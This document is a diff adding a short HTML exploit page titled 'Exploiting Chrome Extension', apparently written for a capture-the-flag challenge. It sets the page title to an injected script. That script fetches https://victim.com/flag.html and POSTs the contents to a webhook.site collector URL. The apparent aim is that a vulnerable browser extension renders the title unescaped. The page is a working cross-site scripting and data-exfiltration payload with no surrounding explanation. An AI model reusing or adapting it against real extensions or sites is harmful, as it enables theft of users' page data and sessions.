@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploiting Chrome Extension</title>
+    <script>
+        document.title = `<script>
+        fetch('https://victim.com/flag.html')
+          .then(res => res.text())
+          .then(data => fetch('https://webhook.site/fd72ea59-3fa6-4bc7-8a83-176bf7ad585b',{
+              method:'POST',body:data
+          }));
+        </script>`;
+    </script>
+</head>
+<body>
+    <h1>Waiting for extension to trigger...</h1>
+</body>
+</html>
